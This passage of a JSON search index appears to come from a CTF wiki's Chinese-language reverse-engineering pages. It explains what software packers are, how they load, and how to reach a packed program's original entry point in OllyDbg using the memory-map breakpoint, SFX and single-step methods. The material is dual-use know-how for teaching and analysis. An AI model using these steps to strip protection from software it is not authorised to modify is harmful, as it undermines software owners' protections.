\u627e\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a .rsrc , \u6309F2\u4e0b\u65ad\u70b9, \u7136\u540e\u6309 SHIFT+F9 \u8fd0\u884c\u5230\u65ad\u70b9 \u518d\u6309 ALT+M , \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u7a0b\u5e8f\u7684\u7b2c\u4e00\u4e2a .rsrc \u4e0a\u9762\u7684 .text (\u5728\u793a\u4f8b\u4e2d\u662f 00401000 \u5904), \u6309F2\u4e0b\u65ad\u70b9. \u7136\u540e\u6309 SHIFT+F9 \uff08\u6216\u8005\u662f\u5728\u6ca1\u5f02\u5e38\u60c5\u51b5\u4e0b\u6309F9\uff09","title":"\u8981\u70b9"},{"location":"reverse/unpack/memory/#_2","text":"\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 4_memory.zip OD\u8f7d\u5165\u7a0b\u5e8f, \u5728\u83dc\u5355\u680f\u7684 \u9009\u9879->\u8c03\u8bd5\u8bbe\u7f6e->\u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u52fe\u9009\u6240\u6709\u7684\u5ffd\u7565\u5f02\u5e38 \u6309\u4e0b Alt+M \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u627e\u5230\u8d44\u6e90\u6bb5, \u4e5f\u5c31\u662f \u5730\u5740=00407000 , \u5927\u5c0f=00005000 \u7684 .rsrc \u6bb5, \u9009\u4e2dF2\u4e0b\u65ad \u56de\u5230CPU\u7a97\u53e3, \u6309\u4e0bF9\u8fd0\u884c, \u7a0b\u5e8f\u65ad\u5728\u4e86 0040D75F \u5904 \u518d\u6b21\u6309\u4e0b Alt+M \u6253\u5f00\u5185\u5b58\u955c\u50cf, \u5bf9 .text \u4ee3\u7801\u6bb5\u4e0b\u65ad \u518d\u7ee7\u7eed\u8fd0\u884c, \u7a0b\u5e8f\u65ad\u5728\u4e86 004010CC \u5904, \u4e5f\u5c31\u662fOEP","title":"\u793a\u4f8b"},{"location":"reverse/unpack/packer-introduction/","text":"\u8ba4\u8bc6\u58f3\u662f\u4ec0\u4e48 \u00b6 \u58f3 \u662f\u5728\u4e00\u4e9b\u8ba1\u7b97\u673a\u8f6f\u4ef6\u91cc\u4e5f\u6709\u4e00\u6bb5\u4e13\u95e8\u8d1f\u8d23\u4fdd\u62a4\u8f6f\u4ef6\u4e0d\u88ab\u975e\u6cd5\u4fee\u6539\u6216\u53cd\u7f16\u8bd1\u7684\u7a0b\u5e8f\u3002 \u5b83\u4eec\u4e00\u822c\u90fd\u662f\u5148\u4e8e\u7a0b\u5e8f\u8fd0\u884c\uff0c\u62ff\u5230\u63a7\u5236\u6743\uff0c\u7136\u540e\u5b8c\u6210\u5b83\u4eec\u4fdd\u62a4\u8f6f\u4ef6\u7684\u4efb\u52a1\u3002 \u7531\u4e8e\u8fd9\u6bb5\u7a0b\u5e8f\u548c\u81ea\u7136\u754c\u7684\u58f3\u5728\u529f\u80fd\u4e0a\u6709\u5f88\u591a\u76f8\u540c\u7684\u5730\u65b9\uff0c\u57fa\u4e8e\u547d\u540d\u7684\u89c4\u5219\uff0c\u5c31\u628a\u8fd9\u6837\u7684\u7a0b\u5e8f\u79f0\u4e3a \u58f3 \u4e86\u3002 \u58f3\u7684\u5206\u7c7b \u00b6 \u6211\u4eec\u901a\u5e38\u5c06 \u58f3 \u5206\u4e3a\u4e24\u7c7b\uff0c\u4e00\u7c7b\u662f\u538b\u7f29\u58f3\uff0c\u53e6\u4e00\u7c7b\u662f\u52a0\u5bc6\u58f3\u3002 \u538b\u7f29\u58f3 \u00b6 \u538b\u7f29\u58f3\u65e9\u5728 DOS \u65f6\u4ee3\u5c31\u5df2\u7ecf\u51fa\u73b0\u4e86\uff0c\u4f46\u662f\u5f53\u65f6\u56e0\u4e3a\u8ba1\u7b97\u80fd\u529b\u6709\u9650\uff0c\u89e3\u538b\u5f00\u9500\u8fc7\u5927\uff0c\u5e76\u6ca1\u6709\u5f97\u5230\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002 \u4f7f\u7528\u538b\u7f29\u58f3\u53ef\u4ee5\u5e2e\u52a9\u7f29\u51cf PE \u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u9690\u85cf\u4e86 PE \u6587\u4ef6\u5185\u90e8\u4ee3\u7801\u548c\u8d44\u6e90\uff0c\u4fbf\u4e8e\u7f51\u7edc\u4f20\u8f93\u548c\u4fdd\u5b58\u3002 \u901a\u5e38\u538b\u7f29\u58f3\u6709\u4e24\u7c7b\u7528\u9014\uff0c\u4e00\u79cd\u53ea\u662f\u5355\u7eaf\u7528\u4e8e\u538b\u7f29\u666e\u901a PE \u6587\u4ef6\u7684\u538b\u7f29\u58f3\uff0c\u800c\u53e6\u4e00\u79cd\u5219\u4f1a\u5bf9\u6e90\u6587\u4ef6\u8fdb\u884c\u8f83\u5927\u53d8\u5f62\uff0c\u4e25\u91cd\u7834\u574f PE \u6587\u4ef6\u5934\uff0c\u7ecf\u5e38\u7528\u4e8e\u538b\u7f29\u6076\u610f\u7a0b\u5e8f\u3002 \u5e38\u89c1\u7684\u538b\u7f29\u58f3\u6709\uff1aUpx\u3001ASpack\u3001PECompat \u52a0\u5bc6\u58f3 \u00b6 \u52a0\u5bc6\u58f3\u6216\u79f0\u4fdd\u62a4\u58f3\uff0c\u5e94\u7528\u6709\u591a\u79cd\u9632\u6b62\u4ee3\u7801\u9006\u5411\u5206\u6790\u7684\u6280\u672f\uff0c\u5b83\u6700\u4e3b\u8981\u7684\u529f\u80fd\u662f\u4fdd\u62a4 PE \u514d\u53d7\u4ee3\u7801\u9006\u5411\u5206\u6790\u3002 \u7531\u4e8e\u52a0\u5bc6\u58f3\u7684\u4e3b\u8981\u76ee\u7684\u4e0d\u518d\u662f\u538b\u7f29\u6587\u4ef6\u8d44\u6e90\uff0c\u6240\u4ee5\u52a0\u5bc6\u58f3\u4fdd\u62a4\u7684 PE \u7a0b\u5e8f\u901a\u5e38\u6bd4\u539f\u6587\u4ef6\u5927\u5f97\u591a\u3002 \u76ee\u524d\u52a0\u5bc6\u58f3\u5927\u91cf\u7528\u4e8e\u5bf9\u5b89\u5168\u6027\u8981\u6c42\u9ad8\uff0c\u5bf9\u7834\u89e3\u654f\u611f\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u540c\u65f6\u4e5f\u6709\u6076\u610f\u7a0b\u5e8f\u7528\u4e8e\u907f\u514d\uff08\u964d\u4f4e\uff09\u6740\u6bd2\u8f6f\u4ef6\u7684\u68c0\u6d4b\u67e5\u6740\u3002 \u5e38\u89c1\u7684\u52a0\u5bc6\u58f3\u6709\uff1aASProtector\u3001Armadillo\u3001EXECryptor\u3001Themida\u3001VMProtect \u58f3\u7684\u52a0\u8f7d\u8fc7\u7a0b \u00b6 \u4fdd\u5b58\u5165\u53e3\u53c2\u6570 \u00b6 \u52a0\u58f3\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u4fdd\u5b58\u5404\u5bc4\u5b58\u5668\u7684\u503c \u5916\u58f3\u6267\u884c\u5b8c\u6bd5\uff0c\u6062\u590d\u5404\u5bc4\u5b58\u5668\u503c \u6700\u540e\u518d\u8df3\u5230\u539f\u7a0b\u5e8f\u6267\u884c \u901a\u5e38\u7528 pushad / popad \u3001 pushfd / popfd \u6307\u4ee4\u5bf9\u6765\u4fdd\u5b58\u548c\u6062\u590d\u73b0\u573a\u73af\u5883 \u83b7\u53d6\u6240\u9700\u51fd\u6570 API \u00b6 \u4e00\u822c\u58f3\u7684\u8f93\u5165\u8868\u4e2d\u53ea\u6709 GetProcAddress \u3001 GetModuleHandle \u548c LoadLibrary \u8fd9\u51e0\u4e2a API \u51fd\u6570 \u5982\u679c\u9700\u8981\u5176\u4ed6 API \u51fd\u6570\uff0c\u5219\u901a\u8fc7 LoadLibraryA(W) \u6216 LoadLibraryExA(W) \u5c06 DLL \u6587\u4ef6\u6620\u5c04\u5230\u8c03\u7528\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d \u5982\u679c DLL \u6587\u4ef6\u5df2\u88ab\u6620\u5c04\u5230\u8c03\u7528\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u91cc\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528 GetModuleHandleA(W) \u51fd\u6570\u83b7\u5f97 DLL \u6a21\u5757\u53e5\u67c4 \u4e00\u65e6 DLL \u6a21\u5757\u88ab\u52a0\u8f7d\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528 GetProcAddress \u51fd\u6570\u83b7\u53d6\u8f93\u5165\u51fd\u6570\u7684\u5730\u5740 \u89e3\u5bc6\u5404\u533a\u5757\u6570\u636e \u00b6 \u5904\u4e8e\u4fdd\u62a4\u6e90\u7a0b\u5e8f\u4ee3\u7801\u548c\u6570\u636e\u7684\u76ee\u7684\uff0c\u4e00\u822c\u4f1a\u52a0\u5bc6\u6e90\u7a0b\u5e8f\u6587\u4ef6\u7684\u5404\u4e2a\u533a\u5757\u3002\u5728\u7a0b\u5e8f\u6267\u884c\u65f6\u5916\u58f3\u5c06\u8fd9\u4e9b\u533a\u5757\u6570\u636e\u89e3\u5bc6\uff0c\u4ee5\u8ba9\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c \u5916\u58f3\u4e00\u822c\u6309\u533a\u5757\u52a0\u5bc6\uff0c\u6309\u533a\u5757\u89e3\u5bc6\uff0c\u5e76\u5c06\u89e3\u5bc6\u7684\u6570\u636e\u653e\u56de\u5728\u5408\u9002\u7684\u5185\u5b58\u4f4d\u7f6e \u8df3\u8f6c\u56de\u539f\u7a0b\u5e8f\u5165\u53e3\u70b9 \u00b6 \u5728\u8df3\u8f6c\u56de\u5165\u53e3\u70b9\u4e4b\u524d\uff0c\u4e00\u822c\u4f1a\u6062\u590d\u586b\u5199\u539fPE\u6587\u4ef6\u8f93\u5165\u8868\uff08IAT\uff09\uff0c\u5e76\u5904\u7406\u597d\u91cd\u5b9a\u4f4d\u9879\uff08\u4e3b\u8981\u662f DLL \u6587\u4ef6\uff09 \u56e0\u4e3a\u52a0\u58f3\u65f6\u5916\u58f3\u81ea\u5df1\u6784\u9020\u4e86\u4e00\u4e2a\u8f93\u5165\u8868\uff0c\u56e0\u6b64\u5728\u8fd9\u91cc\u9700\u8981\u91cd\u65b0\u5bf9\u6bcf\u4e00\u4e2a DLL \u5f15\u5165\u7684\u6240\u6709\u51fd\u6570\u91cd\u65b0\u83b7\u53d6\u5730\u5740\uff0c\u5e76\u586b\u5199\u5230 IAT \u8868\u4e2d \u505a\u5b8c\u4e0a\u8ff0\u5de5\u4f5c\u540e\uff0c\u4f1a\u5c06\u63a7\u5236\u6743\u79fb\u4ea4\u539f\u7a0b\u5e8f\uff0c\u5e76\u7ee7\u7eed\u6267\u884c","title":"\u4fdd\u62a4\u58f3\u7b80\u4ecb"},{"location":"reverse/unpack/packer-introduction/#_1","text":"\u58f3 \u662f\u5728\u4e00\u4e9b\u8ba1\u7b97\u673a\u8f6f\u4ef6\u91cc\u4e5f\u6709\u4e00\u6bb5\u4e13\u95e8\u8d1f\u8d23\u4fdd\u62a4\u8f6f\u4ef6\u4e0d\u88ab\u975e\u6cd5\u4fee\u6539\u6216\u53cd\u7f16\u8bd1\u7684\u7a0b\u5e8f\u3002 \u5b83\u4eec\u4e00\u822c\u90fd\u662f\u5148\u4e8e\u7a0b\u5e8f\u8fd0\u884c\uff0c\u62ff\u5230\u63a7\u5236\u6743\uff0c\u7136\u540e\u5b8c\u6210\u5b83\u4eec\u4fdd\u62a4\u8f6f\u4ef6\u7684\u4efb\u52a1\u3002 \u7531\u4e8e\u8fd9\u6bb5\u7a0b\u5e8f\u548c\u81ea\u7136\u754c\u7684\u58f3\u5728\u529f\u80fd\u4e0a\u6709\u5f88\u591a\u76f8\u540c\u7684\u5730\u65b9\uff0c\u57fa\u4e8e\u547d\u540d\u7684\u89c4\u5219\uff0c\u5c31\u628a\u8fd9\u6837\u7684\u7a0b\u5e8f\u79f0\u4e3a \u58f3 \u4e86\u3002","title":"\u8ba4\u8bc6\u58f3\u662f\u4ec0\u4e48"},{"location":"reverse/unpack/packer-introduction/#_2","text":"\u6211\u4eec\u901a\u5e38\u5c06 \u58f3 \u5206\u4e3a\u4e24\u7c7b\uff0c\u4e00\u7c7b\u662f\u538b\u7f29\u58f3\uff0c\u53e6\u4e00\u7c7b\u662f\u52a0\u5bc6\u58f3\u3002","title":"\u58f3\u7684\u5206\u7c7b"},{"location":"reverse/unpack/packer-introduction/#_3","text":"\u538b\u7f29\u58f3\u65e9\u5728 DOS \u65f6\u4ee3\u5c31\u5df2\u7ecf\u51fa\u73b0\u4e86\uff0c\u4f46\u662f\u5f53\u65f6\u56e0\u4e3a\u8ba1\u7b97\u80fd\u529b\u6709\u9650\uff0c\u89e3\u538b\u5f00\u9500\u8fc7\u5927\uff0c\u5e76\u6ca1\u6709\u5f97\u5230\u5e7f\u6cdb\u7684\u8fd0\u7528\u3002 \u4f7f\u7528\u538b\u7f29\u58f3\u53ef\u4ee5\u5e2e\u52a9\u7f29\u51cf PE \u6587\u4ef6\u7684\u5927\u5c0f\uff0c\u9690\u85cf\u4e86 PE \u6587\u4ef6\u5185\u90e8\u4ee3\u7801\u548c\u8d44\u6e90\uff0c\u4fbf\u4e8e\u7f51\u7edc\u4f20\u8f93\u548c\u4fdd\u5b58\u3002 \u901a\u5e38\u538b\u7f29\u58f3\u6709\u4e24\u7c7b\u7528\u9014\uff0c\u4e00\u79cd\u53ea\u662f\u5355\u7eaf\u7528\u4e8e\u538b\u7f29\u666e\u901a PE \u6587\u4ef6\u7684\u538b\u7f29\u58f3\uff0c\u800c\u53e6\u4e00\u79cd\u5219\u4f1a\u5bf9\u6e90\u6587\u4ef6\u8fdb\u884c\u8f83\u5927\u53d8\u5f62\uff0c\u4e25\u91cd\u7834\u574f PE \u6587\u4ef6\u5934\uff0c\u7ecf\u5e38\u7528\u4e8e\u538b\u7f29\u6076\u610f\u7a0b\u5e8f\u3002 \u5e38\u89c1\u7684\u538b\u7f29\u58f3\u6709\uff1aUpx\u3001ASpack\u3001PECompat","title":"\u538b\u7f29\u58f3"},{"location":"reverse/unpack/packer-introduction/#_4","text":"\u52a0\u5bc6\u58f3\u6216\u79f0\u4fdd\u62a4\u58f3\uff0c\u5e94\u7528\u6709\u591a\u79cd\u9632\u6b62\u4ee3\u7801\u9006\u5411\u5206\u6790\u7684\u6280\u672f\uff0c\u5b83\u6700\u4e3b\u8981\u7684\u529f\u80fd\u662f\u4fdd\u62a4 PE \u514d\u53d7\u4ee3\u7801\u9006\u5411\u5206\u6790\u3002 \u7531\u4e8e\u52a0\u5bc6\u58f3\u7684\u4e3b\u8981\u76ee\u7684\u4e0d\u518d\u662f\u538b\u7f29\u6587\u4ef6\u8d44\u6e90\uff0c\u6240\u4ee5\u52a0\u5bc6\u58f3\u4fdd\u62a4\u7684 PE \u7a0b\u5e8f\u901a\u5e38\u6bd4\u539f\u6587\u4ef6\u5927\u5f97\u591a\u3002 \u76ee\u524d\u52a0\u5bc6\u58f3\u5927\u91cf\u7528\u4e8e\u5bf9\u5b89\u5168\u6027\u8981\u6c42\u9ad8\uff0c\u5bf9\u7834\u89e3\u654f\u611f\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u540c\u65f6\u4e5f\u6709\u6076\u610f\u7a0b\u5e8f\u7528\u4e8e\u907f\u514d\uff08\u964d\u4f4e\uff09\u6740\u6bd2\u8f6f\u4ef6\u7684\u68c0\u6d4b\u67e5\u6740\u3002 \u5e38\u89c1\u7684\u52a0\u5bc6\u58f3\u6709\uff1aASProtector\u3001Armadillo\u3001EXECryptor\u3001Themida\u3001VMProtect","title":"\u52a0\u5bc6\u58f3"},{"location":"reverse/unpack/packer-introduction/#_5","text":"","title":"\u58f3\u7684\u52a0\u8f7d\u8fc7\u7a0b"},{"location":"reverse/unpack/packer-introduction/#_6","text":"\u52a0\u58f3\u7a0b\u5e8f\u521d\u59cb\u5316\u65f6\u4fdd\u5b58\u5404\u5bc4\u5b58\u5668\u7684\u503c \u5916\u58f3\u6267\u884c\u5b8c\u6bd5\uff0c\u6062\u590d\u5404\u5bc4\u5b58\u5668\u503c \u6700\u540e\u518d\u8df3\u5230\u539f\u7a0b\u5e8f\u6267\u884c \u901a\u5e38\u7528 pushad / popad \u3001 pushfd / popfd \u6307\u4ee4\u5bf9\u6765\u4fdd\u5b58\u548c\u6062\u590d\u73b0\u573a\u73af\u5883","title":"\u4fdd\u5b58\u5165\u53e3\u53c2\u6570"},{"location":"reverse/unpack/packer-introduction/#api","text":"\u4e00\u822c\u58f3\u7684\u8f93\u5165\u8868\u4e2d\u53ea\u6709 GetProcAddress \u3001 GetModuleHandle \u548c LoadLibrary \u8fd9\u51e0\u4e2a API \u51fd\u6570 \u5982\u679c\u9700\u8981\u5176\u4ed6 API \u51fd\u6570\uff0c\u5219\u901a\u8fc7 LoadLibraryA(W) \u6216 LoadLibraryExA(W) \u5c06 DLL \u6587\u4ef6\u6620\u5c04\u5230\u8c03\u7528\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u4e2d \u5982\u679c DLL \u6587\u4ef6\u5df2\u88ab\u6620\u5c04\u5230\u8c03\u7528\u8fdb\u7a0b\u7684\u5730\u5740\u7a7a\u95f4\u91cc\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528 GetModuleHandleA(W) \u51fd\u6570\u83b7\u5f97 DLL \u6a21\u5757\u53e5\u67c4 \u4e00\u65e6 DLL \u6a21\u5757\u88ab\u52a0\u8f7d\uff0c\u5c31\u53ef\u4ee5\u8c03\u7528 GetProcAddress \u51fd\u6570\u83b7\u53d6\u8f93\u5165\u51fd\u6570\u7684\u5730\u5740","title":"\u83b7\u53d6\u6240\u9700\u51fd\u6570 API"},{"location":"reverse/unpack/packer-introduction/#_7","text":"\u5904\u4e8e\u4fdd\u62a4\u6e90\u7a0b\u5e8f\u4ee3\u7801\u548c\u6570\u636e\u7684\u76ee\u7684\uff0c\u4e00\u822c\u4f1a\u52a0\u5bc6\u6e90\u7a0b\u5e8f\u6587\u4ef6\u7684\u5404\u4e2a\u533a\u5757\u3002\u5728\u7a0b\u5e8f\u6267\u884c\u65f6\u5916\u58f3\u5c06\u8fd9\u4e9b\u533a\u5757\u6570\u636e\u89e3\u5bc6\uff0c\u4ee5\u8ba9\u7a0b\u5e8f\u6b63\u5e38\u8fd0\u884c \u5916\u58f3\u4e00\u822c\u6309\u533a\u5757\u52a0\u5bc6\uff0c\u6309\u533a\u5757\u89e3\u5bc6\uff0c\u5e76\u5c06\u89e3\u5bc6\u7684\u6570\u636e\u653e\u56de\u5728\u5408\u9002\u7684\u5185\u5b58\u4f4d\u7f6e","title":"\u89e3\u5bc6\u5404\u533a\u5757\u6570\u636e"},{"location":"reverse/unpack/packer-introduction/#_8","text":"\u5728\u8df3\u8f6c\u56de\u5165\u53e3\u70b9\u4e4b\u524d\uff0c\u4e00\u822c\u4f1a\u6062\u590d\u586b\u5199\u539fPE\u6587\u4ef6\u8f93\u5165\u8868\uff08IAT\uff09\uff0c\u5e76\u5904\u7406\u597d\u91cd\u5b9a\u4f4d\u9879\uff08\u4e3b\u8981\u662f DLL \u6587\u4ef6\uff09 \u56e0\u4e3a\u52a0\u58f3\u65f6\u5916\u58f3\u81ea\u5df1\u6784\u9020\u4e86\u4e00\u4e2a\u8f93\u5165\u8868\uff0c\u56e0\u6b64\u5728\u8fd9\u91cc\u9700\u8981\u91cd\u65b0\u5bf9\u6bcf\u4e00\u4e2a DLL \u5f15\u5165\u7684\u6240\u6709\u51fd\u6570\u91cd\u65b0\u83b7\u53d6\u5730\u5740\uff0c\u5e76\u586b\u5199\u5230 IAT \u8868\u4e2d \u505a\u5b8c\u4e0a\u8ff0\u5de5\u4f5c\u540e\uff0c\u4f1a\u5c06\u63a7\u5236\u6743\u79fb\u4ea4\u539f\u7a0b\u5e8f\uff0c\u5e76\u7ee7\u7eed\u6267\u884c","title":"\u8df3\u8f6c\u56de\u539f\u7a0b\u5e8f\u5165\u53e3\u70b9"},{"location":"reverse/unpack/sfx/","text":"\"SFX\"\u6cd5\u5229\u7528\u4e86Ollydbg\u81ea\u5e26\u7684OEP\u5bfb\u627e\u529f\u80fd, \u53ef\u4ee5\u9009\u62e9\u76f4\u63a5\u8ba9\u7a0b\u5e8f\u505c\u5728OD\u627e\u5230\u7684OEP\u5904, \u6b64\u65f6\u58f3\u7684\u89e3\u538b\u8fc7\u7a0b\u5df2\u7ecf\u5b8c\u6bd5, \u53ef\u4ee5\u76f4\u63a5dump\u7a0b\u5e8f. \u8981\u70b9 \u00b6 \u8bbe\u7f6eOD, \u5ffd\u7565\u6240\u6709\u5f02\u5e38, \u4e5f\u5c31\u662f\u8bf4\u5f02\u5e38\u9009\u9879\u5361\u91cc\u9762\u90fd\u6253\u4e0a\u52fe \u5207\u6362\u5230SFX\u9009\u9879\u5361, \u9009\u62e9\"\u5b57\u8282\u6a21\u5f0f\u8ddf\u8e2a\u5b9e\u9645\u5165\u53e3(\u901f\u5ea6\u975e\u5e38\u6162)\", \u786e\u5b9a \u91cd\u8f7d\u7a0b\u5e8f(\u5982\u679c\u8df3\u51fa\u662f\u5426\"\u538b\u7f29\u4ee3\u7801?\"\u9009\u62e9\"\u5426\", OD\u76f4\u63a5\u5230\u8fbeOEP) \u793a\u4f8b \u00b6 \u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 6_sfx.zip \u9996\u5148\u6211\u4eec\u5728\u83dc\u5355 \u9009\u9879->\u8c03\u8bd5\u8bbe\u7f6e->\u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u52fe\u9009\u6240\u6709\u5ffd\u7565\u5f02\u5e38. \u7136\u540e\u5207\u6362\u5230 SFX \u6807\u7b7e\u9875, \u70b9\u9009\"\u5b57\u8282\u65b9\u5f0f\u8ddf\u8e2a\u771f\u6b63\u5165\u53e3\u5904(\u901f\u5ea6\u975e\u5e38\u6162)\" \u91cd\u8f7d\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u5df2\u7ecf\u505c\u5728\u4e86\u4ee3\u7801\u5165\u53e3\u70b9, \u5e76\u4e14\u4e5f\u4e0d\u9700\u8981\u5bf9OEP\u8fdb\u884c\u91cd\u65b0\u5206\u6790.","title":"SFX \u6cd5"},{"location":"reverse/unpack/sfx/#_1","text":"\u8bbe\u7f6eOD, \u5ffd\u7565\u6240\u6709\u5f02\u5e38, \u4e5f\u5c31\u662f\u8bf4\u5f02\u5e38\u9009\u9879\u5361\u91cc\u9762\u90fd\u6253\u4e0a\u52fe \u5207\u6362\u5230SFX\u9009\u9879\u5361, \u9009\u62e9\"\u5b57\u8282\u6a21\u5f0f\u8ddf\u8e2a\u5b9e\u9645\u5165\u53e3(\u901f\u5ea6\u975e\u5e38\u6162)\", \u786e\u5b9a \u91cd\u8f7d\u7a0b\u5e8f(\u5982\u679c\u8df3\u51fa\u662f\u5426\"\u538b\u7f29\u4ee3\u7801?\"\u9009\u62e9\"\u5426\", OD\u76f4\u63a5\u5230\u8fbeOEP)","title":"\u8981\u70b9"},{"location":"reverse/unpack/sfx/#_2","text":"\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 6_sfx.zip \u9996\u5148\u6211\u4eec\u5728\u83dc\u5355 \u9009\u9879->\u8c03\u8bd5\u8bbe\u7f6e->\u5f02\u5e38\u6807\u7b7e\u9875 \u4e2d\u52fe\u9009\u6240\u6709\u5ffd\u7565\u5f02\u5e38. \u7136\u540e\u5207\u6362\u5230 SFX \u6807\u7b7e\u9875, \u70b9\u9009\"\u5b57\u8282\u65b9\u5f0f\u8ddf\u8e2a\u771f\u6b63\u5165\u53e3\u5904(\u901f\u5ea6\u975e\u5e38\u6162)\" \u91cd\u8f7d\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u5df2\u7ecf\u505c\u5728\u4e86\u4ee3\u7801\u5165\u53e3\u70b9, \u5e76\u4e14\u4e5f\u4e0d\u9700\u8981\u5bf9OEP\u8fdb\u884c\u91cd\u65b0\u5206\u6790.","title":"\u793a\u4f8b"},{"location":"reverse/unpack/trace/","text":"\u5355\u6b65\u8ddf\u8e2a\u6cd5\u7684\u539f\u7406\u5c31\u662f\u901a\u8fc7Ollydbg\u7684\u6b65\u8fc7(F8), \u6b65\u5165(F7)\u548c\u8fd0\u884c\u5230(F4)\u529f\u80fd, \u5b8c\u6574\u8d70\u8fc7\u7a0b\u5e8f\u7684\u81ea\u8131\u58f3\u8fc7\u7a0b, \u8df3\u8fc7\u4e00\u4e9b\u5faa\u73af\u6062\u590d\u4ee3\u7801\u7684\u7247\u6bb5, \u5e76\u7528\u5355\u6b65\u8fdb\u5165\u786e\u4fdd\u7a0b\u5e8f\u4e0d\u4f1a\u7565\u8fc7OEP. \u8fd9\u6837\u53ef\u4ee5\u5728\u8f6f\u4ef6\u81ea\u52a8\u8131\u58f3\u6a21\u5757\u8fd0\u884c\u5b8c\u6bd5\u540e, \u5230\u8fbeOEP, \u5e76dump\u7a0b\u5e8f. \u8981\u70b9 \u00b6 \u6253\u5f00\u7a0b\u5e8f\u6309F8\u5355\u6b65\u5411\u4e0b, \u5c3d\u91cf\u5b9e\u73b0\u5411\u4e0b\u7684jmp\u8df3\u8f6c \u4f1a\u7ecf\u5e38\u9047\u5230\u5927\u7684\u5faa\u73af, \u8fd9\u65f6\u8981\u591a\u7528 F4 \u6765\u8df3\u8fc7\u5faa\u73af \u5982\u679c\u51fd\u6570\u8f7d\u5165\u65f6\u4e0d\u8fdc\u5904\u5c31\u662f\u4e00\u4e2acall(\u8fd1call), \u90a3\u4e48\u6211\u4eec\u5c3d\u91cf\u4e0d\u8981\u76f4\u63a5\u8df3\u8fc7, \u800c\u662f\u8fdb\u5165\u8fd9\u4e2acall \u4e00\u822c\u8df3\u8f6c\u5e45\u5ea6\u5927\u7684jmp\u6307\u4ee4, \u90fd\u6781\u6709\u53ef\u80fd\u662f\u8df3\u8f6c\u5230\u4e86\u539f\u7a0b\u5e8f\u5165\u53e3\u70b9(OEP) \u793a\u4f8b \u00b6 \u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 1_trace.zip \u5355\u6b65\u8ddf\u8e2a\u6cd5\u5176\u5b9e\u5c31\u662f\u4e00\u6b65\u4e00\u6b65\u5c3d\u91cf\u4ece\u7a0b\u5e8f\u5165\u53e3\u70b9\u5f80\u4e0b\u8d70, \u5728\u5355\u6b65\u7684\u8fc7\u7a0b\u4e2d\u6ce8\u610fEIP\u4e0d\u8981\u8dd1\u504f\u4e86, \u4f46\u662f\u5bf9\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u590d\u6742\u7684\u58f3\u800c\u8a00, \u5355\u6b65\u7684\u8fc7\u7a0b\u4f1a\u663e\u5f97\u5f02\u5e38\u67af\u71e5\u800c\u4e14\u5bb9\u6613\u628a\u81ea\u5df1\u7ed5\u6655. \u6240\u4ee5\u5355\u6b65\u8ddf\u8e2a\u4e5f\u5e38\u7528\u4e8e\u5206\u6790\u4e00\u4e9b\u5173\u952e\u4ee3\u7801\u90e8\u5206(\u8ddf\u9759\u6001\u5206\u6790\u76f8\u7ed3\u5408), \u800c\u4e0d\u662f\u5b8c\u5168\u5730\u4ece\u5934\u5206\u6790\u5230\u5c3e, \u8fd9\u6709\u8fdd\u9006\u5411\u5de5\u7a0b\u7684\u7406\u5ff5. \u7528Ollydbg\u6253\u5f00\u538b\u7f29\u5305\u5185\u7684Notepad.exe, \u505c\u5728\u4e86\u4e0b\u56fe\u4f4d\u7f6e. \u5165\u53e3\u70b9\u662f\u4e00\u4e2a pushad \u4fdd\u5b58\u6240\u6709\u5bc4\u5b58\u5668\u72b6\u6001\u5230\u6808\u4e2d, \u968f\u540e\u4fbf\u662f\u4e00\u4e2a call \u8c03\u7528\u4f4d\u4e8e 0040D00A \u5904\u7684\u51fd\u6570. \u8c03\u7528\u540e\u4fbf\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 459DD4F7 \u5904, \u4e4b\u540e\u7684 push ebp \u548c retn \u663e\u7136\u6ca1\u6709\u4efb\u4f55\u610f\u4e49. \u50cf\u8fd9\u79cd\u5165\u53e3\u70b9\u9644\u8fd1\u5c31\u662f\u4e00\u4e2a call \u7684\u6211\u4eec\u79f0\u4e3a \u8fd1call , \u5bf9\u4e8e\u8fd1call\u6211\u4eec\u9009\u62e9\u6b65\u8fdb, \u6309\u4e0bF7(\u5f53\u7136\u4f60\u4e5f\u53ea\u80fd\u9009\u62e9\u6b65\u8fdb, \u4e0d\u7136EIP\u5c31\u8dd1\u504f\u7a0b\u5e8f\u505c\u6b62\u4e86). \u6b65\u8fdb\u540e\u53c8\u662f\u4e00\u4e2a call , \u6211\u4eec\u7ee7\u7eed\u6b65\u8fdb, \u6309F7, \u8ddf\u8fdb\u540e\u53d1\u73b0\u6ca1\u6709\u8fd1call\u4e86, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u5728\u8c03 GetModuleHandleA , GetProcAddress \u7b49API, \u7ee7\u7eed\u5411\u4e0b\u5206\u6790. 